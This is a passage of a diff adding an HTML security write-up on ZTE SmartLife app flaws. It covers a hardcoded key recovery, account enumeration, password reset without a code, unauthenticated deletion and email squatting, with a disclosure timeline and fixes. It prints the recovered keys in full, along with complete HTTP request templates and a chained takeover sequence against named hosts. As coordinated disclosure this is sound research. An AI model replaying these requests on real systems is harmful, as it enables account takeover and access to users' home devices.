+            <p class="weakness-note">Weakness: public bootstrap data plus client-shipped decrypt key <code>096760a7a99d99d12de9fecbfca568c0</code> yielded client key <code>djrom(&amp;)(&amp;)MORJD</code> and secret material used to sign requests reaching the account backend (CVE-2026-86555).</p>
+          </div>
+
+          <div class="request-card">
+            <h3>Bug 2. Account enumeration and accountId disclosure</h3>
+            <pre class="api"><code>POST /zte-sec-uac-iportalbff/external/account/verify.serv HTTP/1.1
+Host: zxuacde.smart-zte.com
+X-App-Id: 271950143414
+X-Tenant-Id: 10001
+X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
+X-Auth-Value: &lt;fresh AES-GCM token encrypted with "djrom(&amp;)(&amp;)MORJD"&gt;
+X-Lang-Id: en_US
+Content-Type: application/json
+
+{
+  "key": "<span class="hl-bad">&lt;aes_gcm_encrypt(email, key="djrom(&amp;)(&amp;)MORJD")&gt;</span>"
+}
+
+registered   -&gt; <span class="hl-bad">code=0000 + accountId</span>
+unregistered -&gt; <span class="hl-bad">code=0004</span></code></pre>
+            <p class="weakness-note">Weakness: the target email was encrypted with the recovered client key <code>djrom(&amp;)(&amp;)MORJD</code>. The endpoint acted as a registered-account oracle and disclosed the backend account identifier on the success path (CVE-2026-86554).</p>
+          </div>
+
+          <div class="request-card">
+            <h3>Bug 3. Password reset without verification code</h3>
+            <pre class="api"><code>POST /zte-sec-uac-iportalbff/external/account/password/reset.serv HTTP/1.1
+Host: zxuacde.smart-zte.com
+X-App-Id: 271950143414
+X-Tenant-Id: 10001
+X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
+X-Auth-Value: &lt;fresh AES-GCM token encrypted with "djrom(&amp;)(&amp;)MORJD"&gt;
+X-Lang-Id: en_US
+Content-Type: application/json
+
+{
+  "accountId": "A&lt;target accountId&gt;",
+  "newPassword": "&lt;attacker-selected password&gt;"
+  <span class="hl-bad">// no reset code, no old password, no bound reset transaction</span>
+}</code></pre>
+            <p class="weakness-note">Weakness: account state changed on the basis of accountId plus new password alone. The missing verification step is the bug (CVE-2026-86553).</p>
+          </div>
+
+          <div class="request-card">
+            <h3>Bug 4. Account deletion without user token on the earlier runtime-selected path</h3>
+            <pre class="api"><code>POST /zte-sec-uac-iportalbff/external/account/delete.serv HTTP/1.1
+Host: uactest.ztems.com
+X-App-Id: 271950143414
+X-Tenant-Id: 10001
+X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
+X-Auth-Value: &lt;fresh AES-GCM token encrypted with "djrom(&amp;)(&amp;)MORJD"&gt;
+X-Emp-No: A&lt;target accountId&gt;
+X-Lang-Id: en_US
+Content-Type: application/json
+
+{
+  "accountId": "A&lt;target accountId&gt;"
+  <span class="hl-bad">// no user Bearer token in the validated earlier-path behavior</span>
+}</code></pre>
+            <p class="weakness-note">Weakness: the earlier path accepted application context plus account identifier for destructive account action. ZTE later said the production path requires a token.</p>
+          </div>
+
+          <div class="request-card">
+            <h3>Bug 5. Arbitrary email pre-registration / account squatting</h3>
+            <pre class="api"><code>POST /zte-sec-uac-iportalbff/external/account/person/signup.serv HTTP/1.1
+Host: zxuacde.smart-zte.com
+X-App-Id: 271950143414
+X-Tenant-Id: 10001
+X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
+X-Auth-Value: &lt;fresh AES-GCM token encrypted with "djrom(&amp;)(&amp;)MORJD"&gt;
+X-Lang-Id: en_US
+Content-Type: application/json
+
+{
+  "email": "&lt;arbitrary victim identity&gt;",
+  "password": "&lt;chosen password&gt;",
+  "countryCode": "DE",
+  <span class="hl-bad">"mailboxOwnership": "not yet proven"</span>
+}</code></pre>
+            <p class="weakness-note">Weakness: account creation and later login succeeded before mailbox ownership was proven, allowing identity reservation and squatting (CVE-2026-86552).</p>
+          </div>
+
+          <div class="request-card">
+            <h3>Postcondition: Login with new password</h3>
+            <pre class="api"><code>POST /zte-sec-uac-iportalbff/external/auth/login.serv HTTP/1.1
+Host: zxuacde.smart-zte.com
+X-App-Id: 271950143414
+X-Tenant-Id: 10001
+X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
+X-Auth-Value: &lt;fresh AES-GCM token encrypted with "djrom(&amp;)(&amp;)MORJD"&gt;
+X-Lang-Id: en_US
+Content-Type: application/json
+
+{
+  "loginName": "<span class="hl-bad">&lt;aes_gcm_encrypt(email, key="djrom(&amp;)(&amp;)MORJD")&gt;</span>",
+  "passWord": "<span class="hl-bad">&lt;aes_gcm_encrypt(newPassword, key="djrom(&amp;)(&amp;)MORJD")&gt;</span>",
+  "loginSystemCode": "271950143414",
+  "loginClientIp": "127.0.0.1",
+  "verifyCode": "<span class="hl-bad">&lt;sha256_hex(loginName + passWord + ip + systemCode)&gt;</span>"
+}</code></pre>
+            <p class="weakness-note">Proof: using the attacker-set password encrypted with <code>djrom(&amp;)(&amp;)MORJD</code> and the corresponding verifyCode hash, login returns a valid session token for the proof account.</p>
+          </div>
+        </div>
+      </section>
+
+      <section id="account-takeover">
+        <h2>The account takeover bug</h2>
+        <p>
+          The password-reset issue is the part that matters most from an impact standpoint. In a normal account system, password reset should be gated by a server-side reset transaction: send a code, verify the code, bind the reset to the target account, then allow the password change.
+        </p>
+        <p>
+          In the validated SmartLife flow, the backend accepted a reset using the account target and a new password without the missing verification step. After reset, login with the new password succeeded for the researcher-controlled proof account.
+        </p>
+        <p>
+          The enumeration issue located the account target, and the reset issue changed account state and produced a valid login outcome.
+        </p>
+        <p>
+          The proof sequence for the owned test account was:
+        </p>
+        <p class="snippet-caption">Owned-account proof sequence</p>
+        <pre class="flow"><code>1. verify(fresh_email)          -&gt; account does not exist
+2. signup(fresh_email)          -&gt; account created
+3. verify(fresh_email)          -&gt; account exists + backend accountId
+4. reset(accountId, newPass)    -&gt; success without reset code
+5. login(fresh_email, oldPass)  -&gt; rejected
+6. login(fresh_email, newPass)  -&gt; success + session token</code></pre>
+        <p>
+          Steps 5 and 6 establish the state change: the reset replaced the account password, and the same account system accepted the new password afterward.
+        </p>
+      </section>
+
+      <section>
+        <h2>Why the impact was deeper than client-secret exposure</h2>
+        <p>
+          A hardcoded or recoverable client secret can sometimes be dismissed as a mobile reverse-engineering issue. That framing would miss the real impact here.
+        </p>
+        <p>
+          The app-auth recovery was the entry point. The verified account bugs were the impact:
+        </p>
+        <div class="matrix">
+          <div class="matrix-row">
+            <strong>App-auth recovery</strong>
+            <span>Allowed requests to reach backend account APIs as a valid SmartLife application context.</span>
+          </div>
+          <div class="matrix-row">
+            <strong>Enumeration</strong>
+            <span>Turned an email address into account existence and a backend account identifier.</span>
+          </div>
+          <div class="matrix-row">
+            <strong>Password reset</strong>
+            <span>Allowed account state change without a verified reset transaction.</span>
+          </div>
+          <div class="matrix-row">
+            <strong>Login postcondition</strong>
+            <span>Confirmed that the attacker-selected password became valid for the proof account.</span>
+          </div>
+        </div>
+        <p>
+          That is the difference between "the app contains a secret" and "the account backend can be driven into takeover."
+        </p>
+      </section>
+
+      <section id="sdk-surface">
+        <h2>What the SDK exposed after account login</h2>
+        <p>
+          The account takeover mattered because SmartLife account state was not isolated from the rest of the app. Static analysis showed the login result being wired into the ZTE Homecare SDK: the app set the account identifier and access token, then continued into home, device, and sign-info flows.
+        </p>
+        <p>
+          In the Homecare request stack, authenticated requests carried the account token as a bearer credential and marked the caller as SmartLife:
+        </p>
+        <p class="snippet-caption">Homecare SDK request model</p>
+        <pre class="api"><code>Authorization: Bearer &lt;SmartLife access token&gt;
+appFrom: smartLife
+
+ZTEHomecareSDK.setAccessToken(login_result.token)
+ZTEHomecareSDK.setAccountId(login_result.accountId)</code></pre>
+        <p>
+          That made the confirmed account takeover more than a profile bug. The same app-side account session was the credential path for a broader Homecare cloud surface.
+        </p>
+
+        <h3>Home, room, and device inventory</h3>
+        <p>
+          The APK exposed endpoints for listing homes, rooms, and bound devices. These are the routes that turn an account session into a map of the user's SmartLife environment.
+        </p>
+        <pre class="api"><code>/api/home-manage/query-list
+/api/room-manage/query-list
+/api/device-manage/ztelife2.0/query-list
+/api/device-manage/query-list</code></pre>
+
+        <h3>Device binding, unbinding, and sharing</h3>
+        <p>
+          The SDK also contained cloud routes for binding state and sharing relationships. These are high-value because they affect who can see or control a home/device graph.
+        </p>
+        <pre class="api"><code>/api/device-manage/bind
+/api/device-manage/query-bindstatus
+/api/device-manage/unbind
+/api/share-device/accept
+/api/share-device/unshare
+/api/home-member/add-accept</code></pre>
+
+        <h3>Cloud-to-device command and upgrade paths</h3>
+        <p>
+          The router/device side was visible through cloud MQTT forwarding and one-key upgrade orchestration. Those routes show that a SmartLife account session sits directly upstream of command forwarding and upgrade actions, not just profile settings.
+        </p>
+        <pre class="api"><code>/api/v1/self-app/mqtt-forwarding
+/api/v1/self-app/get-mqtt-forwarding-result
+/api/v1/self-app/one-key-upgrade/exec-upgrade
+/api/v1/self-app/one-key-upgrade/get-upgrade-result</code></pre>
+
+        <h3>Camera, sensor, sub-user, and defence surface</h3>
+        <p>
+          A separate SDK constants class exposed privacy and security-device route families. That widened the visible post-login surface beyond account lifecycle endpoints alone.
+        </p>
+        <pre class="api"><code>/api/list-camera
+/api/list-camera-state
+/api/cloud/get-camera-tsgroups
+/api/list-camera-cautions
+/api/list-sub-users
+/api/list-user-logs
+/api/list-sensor-infos
+/api/list-sensor-logs
+/api/set-camera-view
+/api/notify-camera-caution
+/api/unbind-camera
+/api/sechost/set-sechost-defence
+/api/set-sensor-defence</code></pre>
+        <p>
+          The verified account takeover produced the same account session the app uses to enter the Homecare device plane. The SDK surface shows how much cloud and device functionality sits behind that session boundary.
+        </p>
+      </section>
+
+      <section>
+        <h2>The host confusion</h2>
+        <p>
+          Environment naming created noise during the case. Earlier proof material involved a runtime-selected backend whose hostname contained <code>test</code>, which naturally raised the production-versus-test question.
+        </p>
+        <p>
+          Later runtime work against the official public client showed a cleaner current path: <code>zxuacde.smart-zte.com</code>. That host is an internet-facing HTTPS domain serving the SmartLife UAC/account backend used by the official mobile app. The later retest reproduced the important account behaviors there, including verification, signup, password reset, and login on controlled proof accounts.
+        </p>
+        <p>
+          The delete endpoint is the exception. On the newer runtime path, the delete test returned token-check failure. ZTE later said the behavior was available only in the test environment and that production requires a token. The confirmed production set therefore excludes deletion.
+        </p>
+      </section>
+
+      <section>
+        <h2>Observed scope</h2>
+        <p>
+          Live validation covered account verification, signup, password reset, login, deletion behavior on the earlier path, and runtime app-auth generation in the public client. Static analysis then mapped the broader Homecare routes reached by the same authenticated account session.
+        </p>
+        <p>
+          That split matters because it shows both the directly verified account failures and the larger device/cloud surface that sits immediately behind the same SmartLife login boundary.
+        </p>
+      </section>
+
+      <section id="zte-verified">
+        <h2>What ZTE verified</h2>
+        <p>
+          ZTE PSIRT confirmed the vulnerability order as submitted, provided CVSS vectors during triage, later confirmed remediation, and assigned four CVEs. ZTE also stated that <code>/account/delete.serv</code> was test-environment-only on the path they considered current, which is why the deletion finding is separated from the four CVE-assigned items.
+        </p>
+
+        <table>
+          <thead>
+            <tr>
+              <th>Bug</th>
+              <th>Finding</th>
+              <th>CVE</th>
+              <th>ZTE score</th>
+              <th>Practical impact</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>1</td>
+              <td>Forged SmartLife app-auth via public bootstrap / client trust recovery</td>
+              <td><a href="https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/874505866159007054" target="_blank" rel="noopener noreferrer"><code>CVE-2026-86555</code></a></td>
+              <td><code>6.2</code></td>
+              <td>Hardcoded AES-GCM key <code>096760a7a99d99d12de9fecbfca568c0</code> decrypted unauthenticated bootstrap responses, exposing static client key <code>djrom(&amp;)(&amp;)MORJD</code> and shared secret material.</td>
+            </tr>
+            <tr>
+              <td>2</td>
+              <td>Account enumeration / accountId disclosure</td>
+              <td><a href="https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/2171542593031840113" target="_blank" rel="noopener noreferrer"><code>CVE-2026-86554</code></a></td>
+              <td><code>4.3</code></td>
+              <td>Registered-account oracle and backend account identifier disclosure.</td>
+            </tr>
+            <tr>
+              <td>3</td>
+              <td>Password reset without verification code</td>
+              <td><a href="https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/2171542593031840100" target="_blank" rel="noopener noreferrer"><code>CVE-2026-86553</code></a></td>
+              <td><code>8.8</code></td>
+              <td>Account takeover once app context and the target account identifier are available.</td>
+            </tr>
+            <tr>
+              <td>4</td>
+              <td>Account deletion without user token</td>
+              <td>Not assigned</td>
+              <td>Not assigned in production</td>
+              <td>ZTE stated this behavior was test-environment-only and that the production path requires a token.</td>
+            </tr>
+            <tr>
+              <td>5</td>
+              <td>Arbitrary email pre-registration / account squatting</td>
+              <td><a href="https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/460174866982102946" target="_blank" rel="noopener noreferrer"><code>CVE-2026-86552</code></a></td>
+              <td><code>5.4</code></td>
+              <td>Email identity reservation before mailbox ownership is proven in the validated signup flow.</td>
+            </tr>
+          </tbody>
+        </table>
+      </section>
+
+      <section id="official-advisories">
+        <h2>Official ZTE advisories</h2>
+        <p>
+          ZTE published the advisory records on its own support bulletin portal and acknowledged the report under my full name. These vendor records are the primary references for the final public version.
+        </p>
+        <ul>
+          <li><a href="https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/2171542593031840100" target="_blank" rel="noopener noreferrer"><strong>CVE-2026-86553</strong>: A password reset vulnerability in ZTE SmartLife APP</a> - High, CVSS 8.8.</li>
+          <li><a href="https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/874505866159007054" target="_blank" rel="noopener noreferrer"><strong>CVE-2026-86555</strong>: Hardcoded Key Vulnerability in ZTE SmartLife APP</a> - Medium, CVSS 6.2 (hardcoded bootstrap decryption key <code>096760a7a99d99d12de9fecbfca568c0</code> and static client key <code>djrom(&amp;)(&amp;)MORJD</code>).</li>
+          <li><a href="https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/2171542593031840113" target="_blank" rel="noopener noreferrer"><strong>CVE-2026-86554</strong>: Email enumeration and account ID leakage vulnerabilities in ZTE SmartLife APP</a> - Medium, CVSS 4.3.</li>
+          <li><a href="https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/460174866982102946" target="_blank" rel="noopener noreferrer"><strong>CVE-2026-86552</strong>: A vulnerability that skips email ownership verification for account registration in ZTE SmartLife APP</a> - Medium, CVSS 5.4.</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>Tools used</h2>
+        <ul>
+          <li><strong>jadx</strong> for decompiling the SmartLife Android client and tracing account, SDK, and request-building flows.</li>
+          <li><strong>APK extraction and resource inspection</strong> for config files, embedded assets, and host-selection material.</li>
+          <li><strong>Frida</strong> for runtime observation of UAC/account context and live app-auth generation inside the public Android app.</li>
+          <li><strong>ADB and Android emulation</strong> for controlled execution of the public client during runtime validation.</li>
+          <li><strong>PowerShell PoC scripts</strong> for replaying the validated account lifecycle flows against researcher-controlled proof accounts.</li>
+          <li><strong>Manual HTTP inspection</strong> for correlating request shape, response codes, and account postconditions across the verified endpoints.</li>
+        </ul>
+      </section>
+
+      <section id="timeline">
+        <h2>Disclosure timeline</h2>
+        <ul class="timeline">
+          <li><span class="date">2026-05-18</span><span>Full technical report sent to ZTE PSIRT in the email body, including the five-bug chain, request examples, observed behavior, weakness mapping, and requested handling.</span></li>
+          <li><span class="date">2026-06-01</span><span>ZTE requested that the same vulnerability details be submitted using its official report template; the completed template was sent that day.</span></li>
+          <li><span class="date">2026-06-12</span><span>After attachment-delivery issues, ZTE asked for the report package again; the zipped report was resent and ZTE confirmed receipt.</span></li>
+          <li><span class="date">2026-06-12/13</span><span>ZTE requested screenshots or video proof; raw evidence summaries, screenshots, video, and PoC scripts were sent.</span></li>
+          <li><span class="date">2026-07-13/16</span><span>ZTE requested app-auth reconstruction details and step-by-step proof for each vulnerability; the supporting-evidence package was sent on July 16.</span></li>
+          <li><span class="date">2026-08-12</span><span>ZTE confirmed the verified findings and provided CVSS vectors.</span></li>
+          <li><span class="date">2026-09-03</span><span>ZTE stated that the vulnerabilities had been fully patched.</span></li>
+          <li><span class="date">2026-09-20</span><span>ZTE published four advisories and assigned <code>CVE-2026-86552</code>, <code>CVE-2026-86553</code>, <code>CVE-2026-86554</code>, and <code>CVE-2026-86555</code>.</span></li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>Fixes that matter</h2>
+        <p>
+          Fixes need to address both layers: remove recoverable bootstrap trust material and enforce account-level authorization at every sensitive endpoint.
+        </p>
+        <ul>
+          <li>Rotate exposed client/app trust material and remove recoverable static secrets from the mobile client.</li>
+          <li>Do not expose backend account identifiers through email verification flows.</li>
+          <li>Return uniform responses for registered and unregistered identities where possible.</li>
+          <li>Require a verified, server-bound reset transaction before password changes.</li>
+          <li>Do not activate or allow login to an email-based account before mailbox ownership is proven.</li>
+          <li>Keep test and production account environments separated so public clients cannot land on weaker lifecycle controls.</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>Takeaway</h2>
+        <p>
+          The core bug was simple: the reset endpoint accepted a password change without asking for a reset code at all. Once the account layer also exposed identity lookup and account identifiers, that became account takeover.
+        </p>
+      </section>
+    </article>
+
+    <footer>
+      Technical write-up by Mina Nageh Salama.
+    </footer>
+  </main>
+</body>
+</html>
